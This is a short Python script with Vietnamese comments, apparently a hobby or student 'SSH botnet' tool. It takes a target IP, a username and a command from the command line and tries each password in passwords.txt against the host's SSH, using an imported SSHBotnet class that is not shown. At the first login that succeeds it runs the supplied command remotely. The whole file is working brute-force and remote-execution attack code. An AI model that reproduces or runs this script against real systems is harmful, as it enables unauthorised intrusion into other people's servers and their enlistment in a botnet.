import optparse

from botnet import SSHBotnet


def read_file(filename): # đọc file
    with open(filename, 'r') as file:
        return [line.rstrip('\n') for line in file] # đọc từng dòng  ,bỏ \n ở cuối


def get_argument():
    # khởi tạo 1 đối tượng
    parser = optparse.OptionParser()
    # -h hoặc --host được sử dụng để truyền cổng vào chương trình.
    parser.add_option('-i', '--ip', dest='ip', help='Enter address ip to scan ')
    parser.add_option('-u', '--user', dest='user', help='Enter username  to scan ')
    parser.add_option('-c', '--command', dest='command', help='Enter command  to excute ')
    options, arguments = parser.parse_args()
    if not options.ip:
        parser.error('Please enter address ip valid ! Example 192.168.20.1')
    return options


def connect_botnet(hostname, username, key, command): # kết nối
    try:
        ssh = SSHBotnet(hostname, username, key) # tạo 1 đối tuong SSH BOtnet
        if ssh:
            print()
            print('\t\t===> Found Botnet <====')
            ssh.show_infor() # hiển thị
            print()
            ssh.excute(command) # thực thi lệnh
            return True
    except:
        return False


def attack(file_name):
    try:
        keys = read_file(file_name) # pas lấy đọc từ file
        hostname = get_argument().ip # địa chỉ ip
        username = get_argument().user  # người dùng
        command = get_argument().command    # lệnh thực thi
        for key in keys:
            if connect_botnet(hostname, username, key, command):
                break
    except:
        pass


if __name__ == '__main__':
    attack('passwords.txt')
